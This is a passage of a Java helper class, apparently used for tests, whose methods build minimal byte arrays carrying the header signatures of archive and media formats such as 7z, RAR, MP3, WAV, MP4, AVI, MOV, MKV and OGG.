                0x37, 0x7A, (byte) 0xBC, (byte) 0xAF, 0x27, 0x1C, // 7z signature
                0x00, 0x03,
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00
        };
    }

    public static byte[] createMinimalRarArchive() {
        return new byte[] {
                0x52, 0x61, 0x72, 0x21, 0x1A, 0x07, 0x00 // "Rar!\x1A\x07\x00" signature
        };
    }

    public static byte[] createMinimalMp3() {
        return new byte[] {
                0x49, 0x44, 0x33, 0x03, 0x00, 0x00, // ID3v2.3
                0x00, 0x00, 0x00, 0x0A,
                0x54, 0x49, 0x54, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                (byte) 0xFF, (byte) 0xFB, (byte) 0x90, 0x64 // MP3 syncword
        };
    }

    public static byte[] createMinimalWav() {
        return new byte[] {
                0x52, 0x49, 0x46, 0x46, // "RIFF"
                0x24, 0x00, 0x00, 0x00, // size 36
                0x57, 0x41, 0x56, 0x45, // "WAVE"
                0x66, 0x6D, 0x74, 0x20, // "fmt "
                0x10, 0x00, 0x00, 0x00, // chunk size 16
                0x01, 0x00, // PCM
                0x01, 0x00, // 1 channel
                0x44, (byte) 0xAC, 0x00, 0x00, // 44100 Hz
                (byte) 0x88, 0x58, 0x01, 0x00,
                0x02, 0x00,
                0x10, 0x00,
                0x64, 0x61, 0x74, 0x61, // "data"
                0x00, 0x00, 0x00, 0x00
        };
    }

    public static byte[] createMinimalMp4() {
        return new byte[] {
                0x00, 0x00, 0x00, 0x18, // size 24
                0x66, 0x74, 0x79, 0x70, // "ftyp"
                0x69, 0x73, 0x6F, 0x6D, // "isom"
                0x00, 0x00, 0x02, 0x00,
                0x69, 0x73, 0x6F, 0x6D,
                0x6D, 0x70, 0x34, 0x32
        };
    }

    public static byte[] createMinimalAvi() {
        return new byte[] {
                0x52, 0x49, 0x46, 0x46, // "RIFF"
                0x20, 0x00, 0x00, 0x00, // size 32
                0x41, 0x56, 0x49, 0x20, // "AVI "
                0x4C, 0x49, 0x53, 0x54, // "LIST"
                0x14, 0x00, 0x00, 0x00,
                0x68, 0x64, 0x72, 0x6C, // "hdrl"
                0x61, 0x76, 0x69, 0x68  // "avih"
        };
    }

    public static byte[] createMinimalMov() {
        return new byte[] {
                0x00, 0x00, 0x00, 0x14, // size 20
                0x66, 0x74, 0x79, 0x70, // "ftyp"
                0x71, 0x74, 0x20, 0x20, // "qt  "
                0x00, 0x00, 0x02, 0x00,
                0x71, 0x74, 0x20, 0x20
        };
    }

    public static byte[] createMinimalMkv() {
        return new byte[] {
                0x1A, 0x45, (byte) 0xDF, (byte) 0xA3, // EBML
                0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10,
                0x42, (byte) 0x82, (byte) 0x88, 0x6D, 0x61, 0x74, 0x72, 0x6F, 0x73, 0x6B, 0x61 // "matroska"
        };
    }

    public static byte[] createMinimalOgg() {
        return new byte[] {
                0x4F, 0x67, 0x67, 0x53, // "OggS"
                0x00, 0x02, // BOS
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x01, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00,
                0x00
        };
    }
}
